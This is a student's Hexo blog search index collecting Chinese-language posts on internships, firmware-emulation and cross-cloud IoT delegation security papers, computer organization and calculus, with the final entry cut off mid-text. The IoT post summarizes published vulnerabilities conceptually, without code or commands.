<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实习</title>
      <link href="/2021/11/18/%E5%AE%9E%E4%B9%A0/"/>
      <url>/2021/11/18/%E5%AE%9E%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>这里主要讲述我的实习经历和获取的途径</p><h1 id="先验"><a href="#先验" class="headerlink" title="先验"></a>先验</h1><ol><li>实习不是一定要等到大四，只要你想就能在假期开始实习。</li><li>实习不一定要实地，可以线上远程参与</li><li>实习不是经历，而是学习提升的环境，重要在过程</li><li>实习不是赠予，要自己争取并选择喜欢的方向</li></ol><blockquote><p>Tips: 可以看自己喜欢的实习的岗位的技能要求有方向的提升自己</p></blockquote><h1 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h1><p>我个人的爱好是底层软件相关，所以我的实习经历更多是在我的方向上</p><h3 id="中科院软件所"><a href="#中科院软件所" class="headerlink" title="中科院软件所"></a>中科院软件所</h3><p>PLCT实验室提供，编译器，模拟器等的实习机会，大家可以通过以下网站进行了解</p><p><a href="https://zhuanlan.zhihu.com/p/339463598">实习信息发布</a>  =》<a href="https://zhuanlan.zhihu.com/p/271626256">实习生自我评级</a> =》<a href="https://zhuanlan.zhihu.com/p/271625979">面试形式及内容</a></p><h3 id="清华"><a href="#清华" class="headerlink" title="清华"></a>清华</h3><p>如果对操作系统感兴趣,清华大学每年(可能)会举行相应的夏令营,大家可以选择此页面进行关注</p><p><a href="https://github.com/rcore-os/rCore/wiki/os-tutorial-summer-of-code-2020">清华大学OS夏令营</a></p><h3 id="计算所"><a href="#计算所" class="headerlink" title="计算所"></a>计算所</h3><p>计算所的”开源英才”实习计划,面向现在比较火热的芯片开发和底层软件开发(一生一芯和香山了解一下)</p><p><a href="https://www.aliyundrive.com/s/wGAAEWC7YqV">“开源英才”实习计划</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其实其他的实验室及公司的实习同理,大家只要想就可以迈出属于自己的一大步,每一个实习的要求只要大致满足(或者现在开始努力满足),都是很有机会的</p><h1 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h1><p>网络与开源软件协会为大家构建了课程指南和教辅材料的仓库,大家可以访问下载和参考</p><p><a href="https://github.com/NAOSI-DLUT/DLUT_SE_Courses">Github仓库</a>   <a href="http://file.dingisoul.cn/">文件下载服务器</a>  <a href="https://naosi-dlut.github.io/DLUT_SE_Courses/">课程指南</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN</title>
      <link href="/2021/10/04/PWN/"/>
      <url>/2021/10/04/PWN/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>μEmu</title>
      <link href="/2021/09/14/Inference/"/>
      <url>/2021/09/14/Inference/</url>
      
        <content type="html"><![CDATA[<p>论文分析及总结</p><a id="more"></a><h2 id="Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference"><a href="#Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference" class="headerlink" title="Automatic Firmware Emulation through Invalidity-guided Knowledge Inference"></a>Automatic Firmware Emulation through Invalidity-guided Knowledge Inference</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>不像现存的工作为每个外设建立一个通用的模型，该文章着眼于正确模拟外设的每一个独立的存取点</p><p><code>( individual peripheral access points )</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A(图片) --&gt; B(符号化寄存器) -- 推理规则 --&gt; C(知识库)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>MCU的代码可以分为三个部分：</p><ul><li>处理核心人物逻辑的 task code  ( in firmware )</li><li>处理外部事件的 kernel 和 driver code</li></ul><blockquote><p>task code , kernel &amp; driver 三者的相对位置和调用关系</p></blockquote><p>代码的常常出问题在 task &amp; driver code （可能因为kernel 是另一个研究领域的，或者有些根本没有kernel)</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>动态分析MCU固件的 task code 很难，因为他需要依赖</p><ul><li>引导时的运行时环境</li><li>task 直接调用的驱动功能</li></ul><p>所以需要模拟器模拟 MCU SoCs 的 task code ，这需要很多人力。</p><blockquote><p>引导(bootstrap) ：启动时进行开机自检（POST）、初始化<a href="https://zh.wikipedia.org/wiki/%E5%91%A8%E9%82%8A%E8%A3%9D%E7%BD%AE">周边设备</a>、然后加载<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>。一些嵌入式系统直接运行存储在<a href="https://zh.wikipedia.org/wiki/ROM">ROM</a>中的可执行程序</p><p>运行时环境（Runtime Environment）：软件库，环境变量，系统资源等</p></blockquote><h4 id="Conducted-Research"><a href="#Conducted-Research" class="headerlink" title="Conducted Research"></a>Conducted Research</h4><ul><li>将不支持的外设转发给真实的硬件<ul><li>大规模不行</li></ul></li><li>模拟抽象层，固件依赖抽象层运行 - <ul><li>需要生态支持，不支持定制SOC</li><li>不好解耦固件和驱动的安全测试</li><li>没有对外设逻辑的测试</li></ul></li><li>全系统模拟 无需硬件 所以可以在硬件不可知时实现高保真度的模拟<ul><li>不能模拟复杂的例子 </li><li>P2IM 需要盲猜读状态寄存器的反应，所以搜索范围太大了-不实际</li><li>Laelaps :  只能找到短期未来的好的选择，长期来说未必好。</li><li>两者都可能会崩溃或死机</li></ul></li></ul><p>失败的原因在于任一时刻外设的动作由多个寄存器状态共同决定的 </p><p>问题的重点在于缺乏<strong>固件语义</strong> 。P2IM 将每一个外设和外设存取单独考虑，而没有将多个寄存器依赖考虑。因为仅使用观察的方法会丢失掉很多<strong>上下文信息</strong>。</p><h4 id="Our-idea"><a href="#Our-idea" class="headerlink" title="Our idea"></a>Our idea</h4><p>模拟整体的硬件行为，包括外设。在每个存取点<strong>考虑依赖</strong>的进行回复，实现这个目标需要回答两个问题</p><ul><li>如何判断外设输入是否是适当的</li><li>如何获得适当的外设输入</li></ul><p>本文有以下观点：</p><ol><li>固件收到的反应不正确时，执行阶段应该反射出错误，并进入一种失效状态</li><li>失效的执行状态直接反应为一条失效的路径</li></ol><p>为了防止执行到失效的路径,符号化外设的响应</p><blockquote><p>When the SR register was accessed, the response to it is dependent upon the value of the CR register at that moment</p><p>我理解的是，当存取SR寄存器时，已知SR的值，所以操作取决于CR的值。- 这句话是为了表述我们对一个寄存器操作时，可能触发此代码段/interrupt，所以要根据CR判断是否触发</p></blockquote><h3 id="Vocabulary"><a href="#Vocabulary" class="headerlink" title="Vocabulary"></a>Vocabulary</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>leverage</td><td>影响</td></tr><tr><td>peripheral</td><td>外设</td></tr><tr><td>heuristic</td><td>启发法</td></tr><tr><td>empirically</td><td>经验地</td></tr><tr><td>knowledge base</td><td>知识库</td></tr><tr><td>integrate</td><td>融入</td></tr><tr><td>mitigation</td><td>缓解，减轻</td></tr><tr><td>propose</td><td>提议，建议</td></tr><tr><td>agnostic</td><td>不可知</td></tr><tr><td>fidelity</td><td>精确</td></tr><tr><td>code snippet</td><td>代码段</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dingisoulの聊天小屋</title>
      <link href="/2021/08/03/botui/"/>
      <url>/2021/08/03/botui/</url>
      
        <content type="html"><![CDATA[<p>聊天室测试</p><a id="more"></a><link href="https://cdn.bootcss.com/botui/0.3.9/botui-theme-default.css" rel="stylesheet"><link href="https://cdn.bootcss.com/botui/0.3.9/botui.min.css" rel="stylesheet"><div class="entry-content">  <div class="moe-mashiro" style="text-align:center; font-size: 50px; margin-bottom: 20px;">[Dingisoulの聊天小屋]</div>  <div id="hello-mashiro" class="popcontainer" style="min-height: 300px; padding: 2px 6px 4px; background-color: rgba(242, 242, 242, 0.5); border-radius: 10px;">    <center>    <p>    </p>    <h4>    与&nbsp;<ruby>    Dingisoul&nbsp;<rp>    （</rp>    <rt>    真（ま）白（しろ）</rt>    <rp>    ）</rp>    </ruby>    对话中...</h4>    <p>    </p>    </center>    <bot-ui></botui>  </div></div><script src="/js/botui.js"></script><script src="/js/ChatRobot.js"></script><script>bot_ui_ini()</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Shattered Chain of Trust</title>
      <link href="/2021/07/10/Trust/"/>
      <url>/2021/07/10/Trust/</url>
      
        <content type="html"><![CDATA[<h1 id="Shattered-Chain-of-Trust-Understanding-Security-Risks-in-Cross-Cloud-IoT-Access-Delegation"><a href="#Shattered-Chain-of-Trust-Understanding-Security-Risks-in-Cross-Cloud-IoT-Access-Delegation" class="headerlink" title="Shattered Chain of Trust: Understanding Security Risks in Cross-Cloud IoT Access Delegation"></a>Shattered Chain of Trust: Understanding Security Risks in Cross-Cloud IoT Access Delegation</h1><h4 id="关键词：Cross-cloud-amp-Delegation-amp-Real-Worlds"><a href="#关键词：Cross-cloud-amp-Delegation-amp-Real-Worlds" class="headerlink" title="关键词：Cross-cloud &amp; Delegation  &amp; Real-Worlds"></a>关键词：Cross-cloud &amp; Delegation  &amp; Real-Worlds</h4><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>作为主要的IoT服务平台，IoT云使得IoT用户能够远程控制设备（这种远程控制甚至可以跨越不同的IoT云平台）。支撑这种跨云平台的设备访问及其权限控制的是各个IoT云平台的授权机制。然而，由于缺少跨IoT云平台授权的行业标准，现有的授权机制往往由各厂商自己开发设计。而统一接口、安全协商机制等的缺失，使得现有的IoT授权机制存在严重安全隐患。本研究工作针对上述问题，对主流IoT云平台的授权机制的安全问题进行了系统性的研究，提出了基于形式化安全验证的授权机制漏洞检测方法，开发了半自动检测与验证工具（VerioT），首次对包括Google Home、Philips Hue、MiHome、Samsung SmartThings等在内的10个主流IoT平台的跨云授权机制进行了详细的安全评估，发现了设备敏感信息泄露、授权数据泄露、OAuth令牌泄露、授权API滥用等多个漏洞。利用这些漏洞可以实现对智能门锁、智能开关、智能灯泡等各种智能家居设备的恶意控制，使得高达数百万用户的智能家居系统和服务受到严重的安全威胁。通过PoC攻击验证和对攻击过程的系统性分析研究，进一步提出了设计安全的跨云IoT授权机制所要遵循的原则。</p><h3 id="Inroduction"><a href="#Inroduction" class="headerlink" title="Inroduction"></a>Inroduction</h3><p>IoT 代理机制存在漏洞， 利用自己开发的半自动验证工具进行了实地的验证</p><p>这种漏洞可能存在于攻击者假冒设备，有权限的公司员工</p><p>行业还未有标准性的解决方法，但本文提出了一些准则</p><p>（进程间调用文件的权限链-IoT设备形式更多，使用的权限协议更加复杂）</p><p>设计一种能包含所有权限的机制，还是分成类来表示权限等级或（不同用处）</p><p>不同的厂商使用不同的权限协议，而那些标准代理协议（比如WAVE）再实际环境需要很长实践部署和起作用，所以首先要做的，还是对现有代理协议的深入分析</p><p>这些攻击可能产生的后果是十分严重的，从失去对设备的控制到被攻击者获取到敏感的设备ID以通过伪装解锁受害者的门锁</p><p>举了几个例子：</p><ul><li>绕过 Tuya Cloud ， 通过使用已在Tuya上失效的OAuth Token，在其他平台访问设备</li></ul><p>方法：</p><ul><li>设计了一个半自动验证工具 VerioT，进行对IoT代理系统的模型检查<ul><li>手工对于手册和app的分析太繁琐了，所以将其抽象化为<strong>基本的委托类型</strong>和<strong>对应的数据流</strong>，这些对于不同的平台都是大致一样的</li><li>利用现有的委托系统进行定制和升级，并利用 Spin 对其进行检查，任何反例都可能代表可能的攻击途径，以判断系统中的弱点 （all except one ？）</li></ul></li></ul><p>成功发现了常用IoT 中的6个高危漏洞</p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h3><ul><li>对于IoT设备权限委托的首个<strong>系统性分析</strong></li><li>IoT委托系统的形式化验证 - 文中的委托系统的<strong>基础模型，委托操作模板，安全特性，改良技术</strong>都能很好的帮助委托系统逐步发展</li></ul><h3 id="Cloud-based-IoT-access"><a href="#Cloud-based-IoT-access" class="headerlink" title="Cloud-based IoT access"></a>Cloud-based IoT access</h3><p><img src="https://securitygossip.com/images/2020-09-27/fig1.PNG" alt="Complex Delegation in IoT"></p><h4 id="设备注册和用户操作："><a href="#设备注册和用户操作：" class="headerlink" title="设备注册和用户操作："></a>设备注册和用户操作：</h4><ul><li>设备通过内置的出厂信息注册到设备供应商或者提供服务的第三方云上</li><li>云验证用户身份，并将其发出的指令转发给设备， 或者可以设置触发条件（回家灯亮） 使设备自动运行</li></ul><h4 id="权限委托"><a href="#权限委托" class="headerlink" title="权限委托"></a>权限委托</h4><ul><li>为了使用户可以方便管理不同厂商的设备，所以出现了将权限委托给 Google Home 的操作</li><li>这种委托表现为 用户（或app？）可以利用  token 访问并控制连接在厂商云的设备</li><li>拿 OAuth token 举例<ul><li>登入 Google Home 的app</li><li>输入厂商云账户的密钥（凭证信息）</li><li>如果通过认证，厂商云会生成access token给 Google Home 作为一种接口访问设备</li></ul></li></ul><h4 id="代理委托链"><a href="#代理委托链" class="headerlink" title="代理委托链"></a>代理委托链</h4><ol><li>设备权限给了厂商云</li><li>厂商云把权限交给了受委托的云（Google Home）</li><li>受委托的云又把权限交给了其他受委托的云</li><li>5.云把权限交给了用户</li></ol><ol start="6"><li>用户把权限又给了其他的云</li></ol><blockquote><p><strong>个人拙见</strong>： 个人觉得 3以后的操作都是有风险的，应该转化为 以厂商云为中心，任何权限操作都应该直接与厂商云交涉（问题可能存在于下面2.3.2.2），同时获得的权限是与设备（实例）绑定的，Google Home 得到的权限只有他才能使用</p></blockquote><h4 id="跨云委托机制"><a href="#跨云委托机制" class="headerlink" title="跨云委托机制"></a>跨云委托机制</h4><ul><li>OAuth ：比如Google，获取到设备ID，名字等来对设备进行操作</li><li>Custom：定制的，可能自组织的 - 比如SmartThings 通过秘密的URL来控制设备，厂商需要上传一个SmartApp（？）</li></ul><p><strong>个人拙见:</strong> 代理链的安全性 和 安全协议的杂糅和复杂性是一个很严重的问题</p><h3 id="2-3-安全需求"><a href="#2-3-安全需求" class="headerlink" title="2.3  安全需求"></a>2.3  安全需求</h3><ol><li>安全且具有一致性的委托协议<ol><li>问题 ：不同厂商的安全约束不同</li><li>要求： 能适应不同安全约束且具有一致性的协议</li></ol></li><li>不可绕过且可传递的委托控制<ol><li>全面性： 安全由多方共同保证</li><li>链：比如 a-&gt;b-&gt;c-&gt;d 如果取消了b的权限，那么cd也要撤销</li></ol></li></ol><h3 id="2-4-威胁模型"><a href="#2-4-威胁模型" class="headerlink" title="2.4 威胁模型"></a>2.4 威胁模型</h3><p>用户模型：</p><ul><li>系统管理员，IoT云 - 可信任的</li><li>被授权的用户 - 有危害的<ul><li>能够获取凭证和其他有用信息，例如发出请求、从日志文档中提取信息、捕获流量等</li><li>无法窃听其他各方之间的通信</li></ul></li></ul><p>权限可以委托给其他用户</p><h2 id="2-跨云IoT委托的安全性"><a href="#2-跨云IoT委托的安全性" class="headerlink" title="2 跨云IoT委托的安全性"></a>2 跨云IoT委托的安全性</h2><p>对 10 个主流的IoT云进行分析，总结了五大漏洞，并将其分为两大类</p><h3 id="2-1-云之间缺少协调"><a href="#2-1-云之间缺少协调" class="headerlink" title="2.1 云之间缺少协调"></a>2.1 云之间缺少协调</h3><h4 id="漏洞一：设备ID泄露"><a href="#漏洞一：设备ID泄露" class="headerlink" title="漏洞一：设备ID泄露"></a>漏洞一：设备ID泄露</h4><p><img src="https://securitygossip.com/images/2020-09-27/fig2.PNG" alt="Figure 2"></p><p>SmartThings把控制权委托给 Google Home ，通过 OAuth token和 设备ID </p><h5 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a><strong>漏洞</strong></h5><ul><li>设备ID 是 长效性的，固定的 - 是触发设备和控制它的认证token</li><li>Google 可能将ID给只是具有 <strong>临时访问权限</strong> 的用户</li></ul><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h5><p>​    Airbnb的房主将 Google Home 上设备的权限给游客，那么游客就会永远掌握了SmartThings 的设备ID，游客可以利用ID制造设备时间伪造等攻击。</p><blockquote><p><strong>个人拙见</strong> ：这类似于 重放攻击 ？要具有随机性，时效性？</p><p>我觉得这也对应了作者前面说的不同的安全协议对于不同信息的重要程度的认知不同，同时我也觉得发放给不信任的用户的信息应该有时效性且跟个人信息绑定</p></blockquote><h4 id="漏洞二：泄露被委托云的秘密"><a href="#漏洞二：泄露被委托云的秘密" class="headerlink" title="漏洞二：泄露被委托云的秘密"></a>漏洞二：泄露被委托云的秘密</h4><p><img src="https://securitygossip.com/images/2020-09-27/fig3.PNG" alt="Figure 3"></p><p>在SmartThings上，delegator需要上传一个SmartApp的软件模块到SmartThings平台上，来帮助执行委派协议，管理设备的访问权限。例如，IFTTT云会通过分享一个秘密的URL来实现对设备访问权限的委派，当SmartThings上报一个事件时，会触发IFTTT云上的一个小程序，通过预先指定的规则来控制IFTTT云上的设备</p><h5 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a><strong>漏洞</strong></h5><ul><li>通过IFTTT SmartApp提供的API，SmartThings用户可以获取秘密URL。该URL是固定的</li></ul><h5 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h5><p>​    在SmartThings上，一旦Airbnb的管理者将设备的权限赋给一位游客，那么IFTTT的秘密URL就会永久暴露，这个游客就可以在之后直接与IFTTT设备进行通信</p><h3 id="2-2-安全政策执行不力"><a href="#2-2-安全政策执行不力" class="headerlink" title="2.2 安全政策执行不力"></a>2.2 安全政策执行不力</h3><h4 id="漏洞三：暴露委托云中的隐藏设备"><a href="#漏洞三：暴露委托云中的隐藏设备" class="headerlink" title="漏洞三：暴露委托云中的隐藏设备"></a>漏洞三：暴露委托云中的隐藏设备</h4><p><img src="https://securitygossip.com/images/2020-09-27/fig4.PNG" alt="Figure 4"></p><p>LIFX是一个IoT设备供应商，如果委派SmartThings来管理设备，则SmartThings需要运行LIFX SmartApp。在SmartThings上，可以将用户能够访问的设备定义为一个组，称作location，其中也包含与设备关联的SmartApp，location是SmartThings设备委派的最小单元；如果管理员想要授权某个location的设备，他需要将该location的控制权赋予delegatee user。LIFX SmartApp可以授权用户仅能访问设备的子集。</p><h5 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h5><ul><li>LIFX SmartApp在SmartThings云上没有得到正确的保护，SmartThings上的授权用户可以从要给location的私有存储中读取信息。如图4所示。</li></ul><h4 id="漏洞四：OAuth-陷阱"><a href="#漏洞四：OAuth-陷阱" class="headerlink" title="漏洞四：OAuth 陷阱"></a>漏洞四：OAuth 陷阱</h4><p><img src="https://securitygossip.com/images/2020-09-27/fig5.PNG" alt="Figure 5"></p><p>Tuya云采用标准的OAuth协议来委派Google Home对设备进行管理控制：Google Home上的用户输入Tuya凭据，如果检测通过，则Tuya会将其OAuth token转发给Google Home。</p><h5 id="漏洞-3"><a href="#漏洞-3" class="headerlink" title="漏洞"></a>漏洞</h5><ul><li>Tuya云使用的OAuth方案不满足IoT委派机制的可传递性要求。</li><li>Tuya云分发的设备访问OAuth token不代表用户，而代表Google</li></ul><h5 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h5><p>如果用户在Tuya云上的访问权限被撤销，他仍可以使用其OAuth token通过Google Home来访问设备</p><h4 id="漏洞五：滥用跨云委托的API"><a href="#漏洞五：滥用跨云委托的API" class="headerlink" title="漏洞五：滥用跨云委托的API"></a>漏洞五：滥用跨云委托的API</h4><img src="/2021/07/10/Trust/Figure6.jpg" class="" title="Figure6"><p>Philips Hue允许被授权用户通过手机应用访问Philips Hue网桥</p><ul><li>首先按下设备上按钮，开启绑定过程</li><li>Philips应用通过本地网络从设备自动获取一个秘密token，称作whitelistID</li><li>用户登陆其Philips应用来从Philips云端获取OAuth token</li></ul><p>有了这两个token，用户就可以通过Philips云来访问Hue网桥。云平台检查OAuth token，然后转发这些命令到设备，由设备检查whitelistID。如果撤销用户的访问权限，管理员只需要在云控制台上删除用户的whitelistID，即删掉设备上的whitelistID，这样用户的命令会被设备拒绝。</p><p>Philips云使用一个API接口将设备访问权限授予另一个IoT云，用户在委托云中输入其Philips凭据，然后调用该API，这会返回OAuth token以及由设备生成的新的whitelistID。这样，委托云就可以向Philips Hue云发出命令来操控设备。</p><h5 id="缺陷："><a href="#缺陷：" class="headerlink" title="缺陷："></a>缺陷：</h5><ul><li>在撤销权限时，管理员会删除whitelstID，但委派用户的帐户仍保留在由Philips云维护的设备访问列表中。</li></ul><h5 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h5><p>在权限被撤销后，用户可以重新调用API接口，获得到新的whitelistID和OAuth token，仍然可以访问 Philips Hue网桥。</p><h2 id="3-系统建模和形式验证"><a href="#3-系统建模和形式验证" class="headerlink" title="3. 系统建模和形式验证"></a>3. 系统建模和形式验证</h2><p><img src="https://securitygossip.com/images/2020-09-27/fig7.PNG" alt="Figure 7"></p><p>半自动验证工具- VerioT 检查现实世界中IoT云委托机制的漏洞</p><h4 id="主要架构"><a href="#主要架构" class="headerlink" title="主要架构"></a>主要架构</h4><ul><li>模型生成器：model generator<ul><li>为每个 dele-setting 生成工程模型</li><li>以 配置文件作为输入</li><li>包括参与者（ delegator and delegatee clouds, user, device） 和对应的委托操作</li></ul></li><li>模型检查器：model checker<ul><li>验证预定义的安全属性</li></ul></li><li>反例分析器：counterexample analyzer<ul><li>生成一种反例，可能的攻击方式，具有跨系统委托的访问路径，使未经授权的用户访问设备</li></ul></li></ul><h4 id="3-2-结果"><a href="#3-2-结果" class="headerlink" title="3.2 结果"></a>3.2 结果</h4><p>评估了主流的10个IoT跨云委托机制，发现了6类新的授权缺陷，手工确认了这些缺陷并使用真实设备实现了这五类缺陷的端到端攻击。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitygossip.com/blog/2020/09/27/shattered-chain-of-trust-understanding-security-risks-in-cross-cloud-iot-access-delegation/">SecurityGossip</a></p><p><a href="http://https//sites.%20google.com/view/shattered-chain-of-trust-under/%20home?authuser=1">VerioT</a></p><p><a href="https://youtu.be/R0FrXgxhyC0">Video</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2021/07/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2021/07/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文是对 408 计算机组成原理的复习思考</p><a id="more"></a><h3 id="海明码"><a href="#海明码" class="headerlink" title="海明码"></a>海明码</h3><ul><li>为什么校验位要放在$2^{i-1}$的这些位呢= 使原信息位D变成H时，二进制中1的分布更加均匀便于奇偶校验，而且其实P和他代表的位是一组的，所以他也要在$2^{i-1}$上，更有趣的我们将在下面提到</li><li>校验位是如何起到作用的 - 一个数所在的位只有0/1两种情况，校验位表示是否是1，通过多个校验位就能表示是哪一位出了问题 比如：假设P1,P2,P3都出了问题，那么出现问题的位数就是0b111即H7，<strong>更有趣的是</strong>如果P2出了问题，P1P3没有，那么0b010代表了H2即P1本身有问题，符合<strong>整体性</strong>。 </li></ul><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><p>王道课程所举的 RGB 的例子改成从3B的数据中提取每个RGB的值比较好，这样可以很好的用到左移和右移都填0的操作，我觉得更巧妙</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 3B = R+G+B</span>R <span class="token operator">=</span> <span class="token number">3</span>B <span class="token operator">>></span> <span class="token number">16</span>G <span class="token operator">=</span> <span class="token number">3</span>B <span class="token operator">&lt;&lt;</span>  <span class="token number">8</span> <span class="token operator">>></span> <span class="token number">16</span>B <span class="token operator">=</span> <span class="token number">3</span>B <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token operator">>></span> <span class="token number">16</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>为什么不能用移码进行运算？</p><p>例： 移码相当于把所有数都移到正数区间 ，比如两个负数相加是个更小的负数而移码所出来会变成一个更大的数，没有统一性 - 本质上是不能实现减法即表示负数。 用补码就可以</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;Electron\&quot; modified=\&quot;2021-07-03T07:21:00.344Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/13.9.9 Chrome/85.0.4183.121 Electron/10.1.5 Safari/537.36\&quot; etag=\&quot;C2pxLFh7ktcjbY-TDBmm\&quot; version=\&quot;13.9.9\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;DEw9geDWxp9FeI83x8Im\&quot; name=\&quot;第 1 页\&quot;&gt;7Vldb9owFP01fuxkJ5DAI2F0m6ZNlZg0aW9u4ibWnDh1zNd+/RzifNmglq7ABPAA5sS+ds6599o3Ae40XX8SOE++8Ygw4MBoDdyPwHF86KnvEthUwMDVQCxoVEGoBeb0D9Eg1OiCRqTodZScM0nzPhjyLCOh7GFYCL7qd3virD9rjmNiAfMQMxv9SSOZVOjI8Vv8M6FxUs+MvHF1JcV1Z30nRYIjvupA7gy4U8G5rFrpekpYyV3NSzXufs/VZmGCZPI1A5If6WD8hW8Q/X7/8PyLYPY1vNNWlpgt9A3rxcpNzQDJoklJpPoXMlwUNARukMiUKQCpZjWARBaP7cJQc7vKTQhPiRQb1WXVEjrUJCUdLmtMEIYlXfbNY61r3JhrZnjgVE3sQO2Czkjb0R7oDGDfRMEXIiR6VJdAw5DrvWBIYhETaRlSjc5tt9BWnwO0cm5avVorB55XK/cgrTKekWsVyjTknlaogSUUtJSSZC378hRS8N9kyhkXrXxPlDEDwozGWRmMSjWi8GBJhKRqd5noCymNonKaYJVQSeY5Dss5V2orVZjgiywi5eph4xKlAbI+1Clqsn2D7HqX7TiNs8NpHLjfP3qCHMr+8ApSGoQfYOeD+gqM3ituTENHjhvv8pWz9vt/0OoQFziycr6lXHmy8FiZ4oocZz0RvedFeT4Nnngm74rt6XyiOiCYr9uLqhXr38rKIq8hv8bUUjtwF91OWcOXmnmRGa47Mu/glJl3fE37Hhob7Htn3veQXXfdgvD4xx8zCM/uBnZJ5+zRD6clJdljkRvKtd3qYv4SpXMH/1n+RHaFd5Nud9SZ0u2IutNKZ9d8l8y/FTpnz3q3qg8a3L656jMNHbl2QFdQ9r3I8ZufF59aLLvSAzMfTHwQBNsGBKMLznvIoL8pAs6274x26jGegvE9mA2B8rtgej16NE96z6aHXQOD2QhMEJgMrzA+mofD76+H+tu+56zSW/uy2J39BQ==&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script><p>本质上补码模拟了在原数轴上绝对值的递增方向</p><p>牢记 ：补码负数运算，有进位代表无溢出，无进位代表溢出</p>]]></content>
      
      
      
        <tags>
            
            <tag> 408 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学一思想</title>
      <link href="/2021/06/14/%E6%95%B0%E5%AD%A6%E4%B8%80%E6%80%9D%E6%83%B3/"/>
      <url>/2021/06/14/%E6%95%B0%E5%AD%A6%E4%B8%80%E6%80%9D%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>本篇文章主要记录数学一中学习过程中迸发的思想</p><a id="more"></a><h1 id="高等数学"><a href="#高等数学" class="headerlink" title="高等数学"></a>高等数学</h1><h3 id="直角坐标系-gt-极坐标系"><a href="#直角坐标系-gt-极坐标系" class="headerlink" title="直角坐标系=&gt;极坐标系"></a>直角坐标系=&gt;极坐标系</h3><p>在直角坐标系变换到极坐标系时, $dxdy=\rho d \rho d \theta $ 这样的原因可以用两种方式解释</p><h4 id="面积法"><a href="#面积法" class="headerlink" title="面积法"></a>面积法</h4><p>两者实际上都是表示围成区域的面积, dxdy 长乘宽很好理解,在极坐标系下是两块扇形面积之差(无图)</p><img src="/2021/06/14/%E6%95%B0%E5%AD%A6%E4%B8%80%E6%80%9D%E6%83%B3/fanshaped.png" class="" title="fanshaped"><p>$$<br>S = \frac 1 2 (\rho+d\rho)^2d\theta - \frac 1 2 \rho^2d\theta=\frac 1 2(d\rho)^2+\rho d\rho d\theta \because (d\rho)^2高阶无穷小,省略<br>$$</p><h4 id="代数法"><a href="#代数法" class="headerlink" title="代数法"></a>代数法</h4><p>两者的变换可以用一个行列式表示<br>$$<br>\frac{dxdy}{d\rho d\theta}=|\frac{\partial(x,y)}{\partial(\rho,\theta)}|=\begin{vmatrix}<br>cos\theta &amp;-\rho sin\theta \\<br>sin\theta &amp;\rho cos\theta  \\<br>\end{vmatrix} = \rho<br>$$</p><h3 id="平面曲线的弧长"><a href="#平面曲线的弧长" class="headerlink" title="平面曲线的弧长"></a>平面曲线的弧长</h3><p>$$<br>\because \frac{dy}{dx}=y’_x \<br>ds =\sqrt{(dx)^2+(dy)^2}=\sqrt{1+(y_x’)^2}dx<br>$$</p><h3 id="第一型曲面积分"><a href="#第一型曲面积分" class="headerlink" 